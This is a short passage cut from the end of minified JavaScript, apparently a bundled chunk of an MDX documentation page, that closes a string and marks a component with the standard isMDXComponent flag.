it."))}f.isMDXComponent=!0}}]);